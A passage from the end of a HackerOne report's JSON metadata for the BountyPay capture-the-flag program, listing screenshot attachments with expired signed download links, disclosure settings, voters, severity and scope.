qFy%2FDPBxmmKDto9anAWsN781BmRlDy5RZO9eZNMWGIYRVcvSk75POfwWIHN0RXGfWg31SHJyzDAZSZOM3Kagl3mkYvmR1mlxl%2F7Wxdxkr9gMjbvH%2FvUmYIl%2FMuIe9UTIVtEXJof3GHP8ozEi4QYwBwGxBI%2F9UeeUT7KthQIbNkpzeImvDRLpkiJTvIku0EClCKE3HomU65erQsoEPwp0Z%2B1KDSdn2y6%2F8B3f12AmMNytEdVTsfpYsJwHpa5ldrCOtv56n6YyUIOMlSmauNd3YAXISEUDWEAvR%2BitCjK02JztBXQAx6E%2FVSAOEfGRUhUUvTfG4MNJfiZFtS3EkZMHtNXOPxH%2BKHwRZLJBIemfk3GNle%2B6ve8CA0v%2BmBSZufZn0bhOSZJSj8JEFXx%2BSVrX9sLN6LL1zsxTwhsCgIBz1t1VTb5%2FYmnsFKEonTNk2L6nSGyKh0E6OxW0Gpv6LXQI%2BbOulfsaMevlpPCK0x3UzZZVhkt9uKAc6sSTYU3ZYxCaT96B1x8AU9cVFetiUS%2FS%2BpJ7KFcDdmg7NxmmR82rqk%2F95Q11hkdNrcvflKU1naXYYR3RaGVQOPn4wsLi%2BxgY6sQHcA8FyNn5BdDkdxWC6Pvkk0Ms0ZxKd%2BmExljJyCpvOJX4hl7PqcQMC6ZWa7lwCx7N3rC19UTcW8KZ7tiezB5sRqVb7a4ttSTZVJLtpt2HKYTnln5CyIMIQ%2BDW6W84g2neFcrtV5IAZBqjMUCtNRur2Gxi9ge8uKY4ZZBVtf47zz%2Fjw55UfZHZofZPDiKeq8Af8oShnRDlX93IqEBMsD5epUFmbTEBefGgEfdSr%2FXAJKio%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2b11e261bc178e7aeab53ed9d388ebe7b560277ac92ec8e6a4803216f99cf78f",
      "file_size": 2152201,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 858290,
      "file_name": "pay-bounty-home.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/FCwX68MzRW7SkW1KAQErQqgA?response-content-disposition=attachment%3B%20filename%3D%22pay-bounty-home.png%22%3B%20filename%2A%3DUTF-8%27%27pay-bounty-home.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXSC2BV6P%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T100612Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDBIYb02bdmQriBWFQCEt2NO%2BhKeraB1Qpp81%2FB0i9PpAIgHE%2BQf3yAo0CZ%2FZ3u4XKtRCYh4rXLiTb1MJbcg0gdWxAqsgUIEBADGgwwMTM2MTkyNzQ4NDkiDCXH8kDWzUxqHWFGdSqPBTU8%2FsCyCfLOsQWZ0n8Vwyc49u2ZrgqAwWPscpryNaiw1d89b1p6tHxiVdX6ZHTu55X%2FmXPMu3l2kl9iEv3sv6fR5NB3AS2601G1Aufr23nWvSUWxu193vVfMoRmlrE%2BwNiG%2FX5RQWLr8xCt43VvqxD1VwBJ1%2FRn3f7YRpNEyFPcpVD%2FZSbzgRJ7ycQykB9d3KUkHYh%2FgnnBxcIyBMa2WQuglu%2BPQdV3k%2FWawLxCd1jZqacsxjIsp%2FgVzSoYMdLXDtKdM3ANmASZNZjoaaX4r5M%2BpkUvnhhqFy%2FDPBxmmKDto9anAWsN781BmRlDy5RZO9eZNMWGIYRVcvSk75POfwWIHN0RXGfWg31SHJyzDAZSZOM3Kagl3mkYvmR1mlxl%2F7Wxdxkr9gMjbvH%2FvUmYIl%2FMuIe9UTIVtEXJof3GHP8ozEi4QYwBwGxBI%2F9UeeUT7KthQIbNkpzeImvDRLpkiJTvIku0EClCKE3HomU65erQsoEPwp0Z%2B1KDSdn2y6%2F8B3f12AmMNytEdVTsfpYsJwHpa5ldrCOtv56n6YyUIOMlSmauNd3YAXISEUDWEAvR%2BitCjK02JztBXQAx6E%2FVSAOEfGRUhUUvTfG4MNJfiZFtS3EkZMHtNXOPxH%2BKHwRZLJBIemfk3GNle%2B6ve8CA0v%2BmBSZufZn0bhOSZJSj8JEFXx%2BSVrX9sLN6LL1zsxTwhsCgIBz1t1VTb5%2FYmnsFKEonTNk2L6nSGyKh0E6OxW0Gpv6LXQI%2BbOulfsaMevlpPCK0x3UzZZVhkt9uKAc6sSTYU3ZYxCaT96B1x8AU9cVFetiUS%2FS%2BpJ7KFcDdmg7NxmmR82rqk%2F95Q11hkdNrcvflKU1naXYYR3RaGVQOPn4wsLi%2BxgY6sQHcA8FyNn5BdDkdxWC6Pvkk0Ms0ZxKd%2BmExljJyCpvOJX4hl7PqcQMC6ZWa7lwCx7N3rC19UTcW8KZ7tiezB5sRqVb7a4ttSTZVJLtpt2HKYTnln5CyIMIQ%2BDW6W84g2neFcrtV5IAZBqjMUCtNRur2Gxi9ge8uKY4ZZBVtf47zz%2Fjw55UfZHZofZPDiKeq8Af8oShnRDlX93IqEBMsD5epUFmbTEBefGgEfdSr%2FXAJKio%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8949eb3cc06931f5ecc49f75a57468fd52547b248a04c1739ff4c451fc486edf",
      "file_size": 45993,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 858292,
      "file_name": "payment-2fa-challenge.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ChxyNhosQsM36JX3n8Lgq3nw?response-content-disposition=attachment%3B%20filename%3D%22payment-2fa-challenge.png%22%3B%20filename%2A%3DUTF-8%27%27payment-2fa-challenge.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXSC2BV6P%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T100612Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDBIYb02bdmQriBWFQCEt2NO%2BhKeraB1Qpp81%2FB0i9PpAIgHE%2BQf3yAo0CZ%2FZ3u4XKtRCYh4rXLiTb1MJbcg0gdWxAqsgUIEBADGgwwMTM2MTkyNzQ4NDkiDCXH8kDWzUxqHWFGdSqPBTU8%2FsCyCfLOsQWZ0n8Vwyc49u2ZrgqAwWPscpryNaiw1d89b1p6tHxiVdX6ZHTu55X%2FmXPMu3l2kl9iEv3sv6fR5NB3AS2601G1Aufr23nWvSUWxu193vVfMoRmlrE%2BwNiG%2FX5RQWLr8xCt43VvqxD1VwBJ1%2FRn3f7YRpNEyFPcpVD%2FZSbzgRJ7ycQykB9d3KUkHYh%2FgnnBxcIyBMa2WQuglu%2BPQdV3k%2FWawLxCd1jZqacsxjIsp%2FgVzSoYMdLXDtKdM3ANmASZNZjoaaX4r5M%2BpkUvnhhqFy%2FDPBxmmKDto9anAWsN781BmRlDy5RZO9eZNMWGIYRVcvSk75POfwWIHN0RXGfWg31SHJyzDAZSZOM3Kagl3mkYvmR1mlxl%2F7Wxdxkr9gMjbvH%2FvUmYIl%2FMuIe9UTIVtEXJof3GHP8ozEi4QYwBwGxBI%2F9UeeUT7KthQIbNkpzeImvDRLpkiJTvIku0EClCKE3HomU65erQsoEPwp0Z%2B1KDSdn2y6%2F8B3f12AmMNytEdVTsfpYsJwHpa5ldrCOtv56n6YyUIOMlSmauNd3YAXISEUDWEAvR%2BitCjK02JztBXQAx6E%2FVSAOEfGRUhUUvTfG4MNJfiZFtS3EkZMHtNXOPxH%2BKHwRZLJBIemfk3GNle%2B6ve8CA0v%2BmBSZufZn0bhOSZJSj8JEFXx%2BSVrX9sLN6LL1zsxTwhsCgIBz1t1VTb5%2FYmnsFKEonTNk2L6nSGyKh0E6OxW0Gpv6LXQI%2BbOulfsaMevlpPCK0x3UzZZVhkt9uKAc6sSTYU3ZYxCaT96B1x8AU9cVFetiUS%2FS%2BpJ7KFcDdmg7NxmmR82rqk%2F95Q11hkdNrcvflKU1naXYYR3RaGVQOPn4wsLi%2BxgY6sQHcA8FyNn5BdDkdxWC6Pvkk0Ms0ZxKd%2BmExljJyCpvOJX4hl7PqcQMC6ZWa7lwCx7N3rC19UTcW8KZ7tiezB5sRqVb7a4ttSTZVJLtpt2HKYTnln5CyIMIQ%2BDW6W84g2neFcrtV5IAZBqjMUCtNRur2Gxi9ge8uKY4ZZBVtf47zz%2Fjw55UfZHZofZPDiKeq8Af8oShnRDlX93IqEBMsD5epUFmbTEBefGgEfdSr%2FXAJKio%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ab6a229426cc4816330bb5dec0b23772aebe4f40d3b948a3f5dd6bc00f9fbc9b",
      "file_size": 40697,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 858313,
      "file_name": "flag.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/WYbJ8FQ6mdzkGnXRoxsR43vN?response-content-disposition=attachment%3B%20filename%3D%22flag.png%22%3B%20filename%2A%3DUTF-8%27%27flag.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXSC2BV6P%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T100612Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDBIYb02bdmQriBWFQCEt2NO%2BhKeraB1Qpp81%2FB0i9PpAIgHE%2BQf3yAo0CZ%2FZ3u4XKtRCYh4rXLiTb1MJbcg0gdWxAqsgUIEBADGgwwMTM2MTkyNzQ4NDkiDCXH8kDWzUxqHWFGdSqPBTU8%2FsCyCfLOsQWZ0n8Vwyc49u2ZrgqAwWPscpryNaiw1d89b1p6tHxiVdX6ZHTu55X%2FmXPMu3l2kl9iEv3sv6fR5NB3AS2601G1Aufr23nWvSUWxu193vVfMoRmlrE%2BwNiG%2FX5RQWLr8xCt43VvqxD1VwBJ1%2FRn3f7YRpNEyFPcpVD%2FZSbzgRJ7ycQykB9d3KUkHYh%2FgnnBxcIyBMa2WQuglu%2BPQdV3k%2FWawLxCd1jZqacsxjIsp%2FgVzSoYMdLXDtKdM3ANmASZNZjoaaX4r5M%2BpkUvnhhqFy%2FDPBxmmKDto9anAWsN781BmRlDy5RZO9eZNMWGIYRVcvSk75POfwWIHN0RXGfWg31SHJyzDAZSZOM3Kagl3mkYvmR1mlxl%2F7Wxdxkr9gMjbvH%2FvUmYIl%2FMuIe9UTIVtEXJof3GHP8ozEi4QYwBwGxBI%2F9UeeUT7KthQIbNkpzeImvDRLpkiJTvIku0EClCKE3HomU65erQsoEPwp0Z%2B1KDSdn2y6%2F8B3f12AmMNytEdVTsfpYsJwHpa5ldrCOtv56n6YyUIOMlSmauNd3YAXISEUDWEAvR%2BitCjK02JztBXQAx6E%2FVSAOEfGRUhUUvTfG4MNJfiZFtS3EkZMHtNXOPxH%2BKHwRZLJBIemfk3GNle%2B6ve8CA0v%2BmBSZufZn0bhOSZJSj8JEFXx%2BSVrX9sLN6LL1zsxTwhsCgIBz1t1VTb5%2FYmnsFKEonTNk2L6nSGyKh0E6OxW0Gpv6LXQI%2BbOulfsaMevlpPCK0x3UzZZVhkt9uKAc6sSTYU3ZYxCaT96B1x8AU9cVFetiUS%2FS%2BpJ7KFcDdmg7NxmmR82rqk%2F95Q11hkdNrcvflKU1naXYYR3RaGVQOPn4wsLi%2BxgY6sQHcA8FyNn5BdDkdxWC6Pvkk0Ms0ZxKd%2BmExljJyCpvOJX4hl7PqcQMC6ZWa7lwCx7N3rC19UTcW8KZ7tiezB5sRqVb7a4ttSTZVJLtpt2HKYTnln5CyIMIQ%2BDW6W84g2neFcrtV5IAZBqjMUCtNRur2Gxi9ge8uKY4ZZBVtf47zz%2Fjw55UfZHZofZPDiKeq8Af8oShnRDlX93IqEBMsD5epUFmbTEBefGgEfdSr%2FXAJKio%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bd28edfe16c903ba8d45cdfb8397e4a384520a3cfac257e12e290a45377b7ccc",
      "file_size": 77226,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2020-07-22T21:29:04.805Z",
  "allow_singular_disclosure_after": -162995828.08865654,
  "singular_disclosure_allowed": true,
  "vote_count": 11,
  "voters": [
    "rook1337",
    "brahim_boufakri01",
    "bcobain23",
    "what_web",
    "trap1001",
    "hitmansmi45",
    "g4ll3g0",
    "noxcaelo",
    "btowers",
    "j3r3",
    "and 1 more..."
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 48138,
    "asset_type": "WILDCARD",
    "asset_identifier": "*.bountypay.h1ctf.com",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
